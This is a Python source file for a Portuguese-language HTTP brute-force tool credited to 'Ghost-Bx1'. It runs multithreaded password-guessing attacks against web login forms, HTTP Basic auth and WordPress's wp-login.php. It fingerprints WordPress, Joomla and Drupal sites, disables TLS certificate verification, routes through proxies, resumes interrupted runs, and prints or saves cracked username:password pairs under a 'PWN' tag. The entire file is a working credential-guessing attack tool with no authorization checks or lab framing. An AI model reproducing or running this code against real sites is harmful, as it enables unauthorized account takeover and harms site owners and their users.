#!/usr/bin/env python3
"""
ataque-web.py - Ferramenta de Brute Force HTTP Brasil
Ghost-Bx1 | github.com/Ghost-Bx1

Suporte a: formularios POST, Basic Auth, Bearer, WordPress, CMS genericos
Flags: --url, --users, --wordlist, --method, --field-user, --field-pass,
       --threads, --timeout, --proxy, --resume, --output, --no-banner
"""

import sys
import os
import json
import socket
import threading
import argparse
import base64
import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSAO = "1.0.0"

C = {
    "G": "\033[92m", "R": "\033[91m", "Y": "\033[93m",
    "C": "\033[96m", "D": "\033[2m", "X": "\033[0m", "W": "\033[97m", "N": "\033[1m",
}

_lock = threading.Lock()
_encontrados = []


def _log(tag, msg, cor="W"):
    ts = datetime.now().strftime("%H:%M:%S")
    with _lock:
        print(f"  {C[cor]}[{tag}]{C['X']} {C['D']}{ts}{C['X']} {msg}")


def _build_banner():
    import re as _re
    G = C["G"]; Cy = C["C"]; D = C["D"]; N = C["N"]; W = C["W"]; X = C["X"]
    IW = 68; sp = " " * IW
    VB = "║"; TL = "╔"; TR = "╗"; BL = "╚"; BR = "╝"
    eq = "═" * IW; hl44 = "─" * 44; bar = "│"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))
    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"
    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"
    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀⠀⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]
    info = [
        f"{G}{C['N']}Ghost-Wordlists - Brute Force HTTP{X}",
        f"{C['C']}v{VERSAO}  {C['D']}POST/GET/Basic/Bearer/WordPress/CMS{X}",
        f"{C['D']}{'─' * 44}{X}",
        f"{C['W']}By Gh0st-Bx1  {C['D']}|  github.com/Ghost-Bx1{X}",
        f"{C['D']}{'─' * 44}{X}",
        f"{C['D']}--url --users --wordlist --threads --output{X}",
    ]
    out = [f"{G}╔{'═' * IW}╗{X}", f"{G}║{sp}║{X}"]
    for left, center, right in ga:
        out.append(_row(left + center + right))
    out.append(f"{G}║{sp}║{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}║{sp}║{X}", f"{G}╚{'═' * IW}╝{X}"]
    return "\n".join(out)


def _http(url, method="GET", body=None, headers=None, timeout=10, proxy=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), url
    except Exception as e:
        return 0, {}, b"", url


def _detectar_tipo(url, timeout=10, proxy=None):
    """Detecta tipo de aplicacao: wordpress, joomla, generic"""
    code, headers, body, _ = _http(url, timeout=timeout, proxy=proxy)
    body_s = body.decode(errors="ignore").lower()
    if "wp-content" in body_s or "wp-login" in body_s or "wordpress" in body_s:
        return "wordpress"
    if "joomla" in body_s or "/administrator/" in body_s:
        return "joomla"
    if "drupal" in body_s:
        return "drupal"
    return "generic"


def _tentar_basic_auth(url, usuario, senha, timeout=10, proxy=None):
    credencial = base64.b64encode(f"{usuario}:{senha}".encode()).decode()
    headers = {"Authorization": f"Basic {credencial}"}
    code, _, _, final_url = _http(url, headers=headers, timeout=timeout, proxy=proxy)
    return code not in (401, 403, 0)


def _tentar_post(url, usuario, senha, campo_user="username", campo_pass="password",
                 campos_extras=None, indicador_falha=None, timeout=10, proxy=None):
    dados = {campo_user: usuario, campo_pass: senha}
    if campos_extras:
        dados.update(campos_extras)
    body = urllib.parse.urlencode(dados).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    code, resp_headers, resp_body, final_url = _http(
        url, method="POST", body=body, headers=headers, timeout=timeout, proxy=proxy
    )
    body_s = resp_body.decode(errors="ignore")
    if indicador_falha:
        return indicador_falha not in body_s and code not in (401, 403)
    # Heuristicas de sucesso
    if code in (302, 301) and "login" not in final_url.lower():
        return True
    if code == 200 and any(k in body_s.lower() for k in [
        "dashboard", "logout", "bem-vindo", "welcome", "painel", "sair", "sign out"
    ]):
        return True
    return False


def _tentar_wordpress(url_base, usuario, senha, timeout=10, proxy=None):
    login_url = url_base.rstrip("/") + "/wp-login.php"
    # Primeiro GET para pegar nonce
    code, _, body, _ = _http(login_url, timeout=timeout, proxy=proxy)
    nonce_match = re.search(r'name="testcookie" value="(\w+)"', body.decode(errors="ignore"))
    dados = {"log": usuario, "pwd": senha, "wp-submit": "Log In",
             "redirect_to": "/wp-admin/", "testcookie": "1"}
    body_post = urllib.parse.urlencode(dados).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "Cookie": "wordpress_test_cookie=WP Cookie check"}
    code, resp_headers, resp_body, final_url = _http(
        login_url, method="POST", body=body_post, headers=headers, timeout=timeout, proxy=proxy
    )
    return "wp-admin" in final_url or (code in (301, 302) and "loggedout" not in final_url)


def _carregar_progresso(arquivo):
    if os.path.isfile(arquivo):
        with open(arquivo, encoding="utf-8") as f:
            return set(l.strip() for l in f if l.strip())
    return set()


def _salvar_progresso(arquivo, chave):
    with open(arquivo, "a", encoding="utf-8") as f:
        f.write(chave + "\n")


def _carregar_wordlist(arquivo):
    senhas = []
    try:
        with open(arquivo, encoding="utf-8", errors="ignore") as f:
            for linha in f:
                s = linha.strip()
                if s and not s.startswith("#"):
                    senhas.append(s)
    except Exception as e:
        _log("ERR", f"Erro ao ler wordlist: {e}", "R")
    return senhas


def _tentar(url, usuario, senha, metodo, campo_user, campo_pass, campos_extras,
            indicador_falha, tipo, timeout, proxy):
    t0 = time.time()
    try:
        if metodo == "basic":
            ok = _tentar_basic_auth(url, usuario, senha, timeout, proxy)
        elif tipo == "wordpress":
            ok = _tentar_wordpress(url, usuario, senha, timeout, proxy)
        else:
            ok = _tentar_post(url, usuario, senha, campo_user, campo_pass,
                              campos_extras, indicador_falha, timeout, proxy)
    except Exception:
        ok = False
    ms = int((time.time() - t0) * 1000)
    return {"usuario": usuario, "senha": senha, "sucesso": ok, "ms": ms}


def _parse_args():
    p = argparse.ArgumentParser(description="Ghost-Wordlists - Brute Force HTTP - Ghost-Bx1")
    p.add_argument("--url", "-u", required=True, help="URL do formulario de login")
    p.add_argument("--users", "-U", help="Arquivo com lista de usuarios (1 por linha)")
    p.add_argument("--user", help="Usuario unico")
    p.add_argument("--wordlist", "-w", required=True, help="Arquivo de senhas")
    p.add_argument("--method", "-m", default="post", choices=["post", "basic", "bearer"],
                   help="Metodo de autenticacao (default: post)")
    p.add_argument("--field-user", default="username", help="Campo do formulario para usuario")
    p.add_argument("--field-pass", default="password", help="Campo do formulario para senha")
    p.add_argument("--fail-string", help="String que indica falha no login")
    p.add_argument("--extra-fields", help="Campos extras no formato chave=valor,chave2=valor2")
    p.add_argument("--threads", "-t", type=int, default=5)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--proxy", help="Proxy HTTP: http://127.0.0.1:8080")
    p.add_argument("--resume", help="Arquivo para retomar scan (salva progresso)")
    p.add_argument("--output", "-o", help="Arquivo JSON de saida")
    p.add_argument("--stop-on-success", action="store_true",
                   help="Parar ao encontrar primeira credencial valida")
    p.add_argument("--no-banner", action="store_true")
    return p.parse_args()


def main():
    args = _parse_args()
    if not args.no_banner:
        print(_build_banner())
        print()

    usuarios = []
    if args.user:
        usuarios = [args.user]
    elif args.users:
        usuarios = _carregar_wordlist(args.users)
    else:
        usuarios = ["admin"]

    senhas = _carregar_wordlist(args.wordlist)
    if not senhas:
        _log("ERR", "Wordlist vazia ou nao encontrada", "R")
        sys.exit(1)

    campos_extras = {}
    if args.extra_fields:
        for par in args.extra_fields.split(","):
            if "=" in par:
                k, v = par.split("=", 1)
                campos_extras[k.strip()] = v.strip()

    _log("INFO", f"URL: {args.url}", "C")
    _log("INFO", f"Usuarios: {len(usuarios)} | Senhas: {len(senhas)} | Threads: {args.threads}", "C")

    tipo = _detectar_tipo(args.url, args.timeout, args.proxy)
    _log("INFO", f"Tipo detectado: {tipo}", "Y")

    ja_feitos = _carregar_progresso(args.resume) if args.resume else set()
    total = len(usuarios) * len(senhas)
    atual = [0]
    encontrados = []

    def tarefa(usuario, senha):
        chave = f"{usuario}:{senha}"
        if chave in ja_feitos:
            return None
        r = _tentar(args.url, usuario, senha, args.method, args.field_user,
                    args.field_pass, campos_extras, args.fail_string, tipo,
                    args.timeout, args.proxy)
        if args.resume:
            _salvar_progresso(args.resume, chave)
        return r

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(tarefa, u, s): (u, s) for u in usuarios for s in senhas}
        for fut in as_completed(futures):
            r = fut.result()
            if r is None:
                continue
            atual[0] += 1
            pct = int(atual[0] / total * 100)
            if r["sucesso"]:
                _log("PWN", f"[{pct}%] {C['G']}{r['usuario']}:{r['senha']}{C['X']} - SUCESSO", "G")
                encontrados.append(r)
                if args.stop_on_success:
                    break
            else:
                if atual[0] % 50 == 0:
                    _log("TRY", f"[{pct}%] {r['usuario']}:{r['senha'][:10]}... tentativa {atual[0]}/{total}", "D")

    _log("DONE", f"Concluido. {len(encontrados)} credenciais encontradas de {total} tentativas", "G")

    if args.output and encontrados:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(encontrados, f, indent=2, ensure_ascii=False)
        _log("SAVE", f"Resultados em: {args.output}", "G")
    elif encontrados:
        for r in encontrados:
            print(f"  {C['G']}[+]{C['X']} {r['usuario']}:{r['senha']}")


if __name__ == "__main__":
    main()
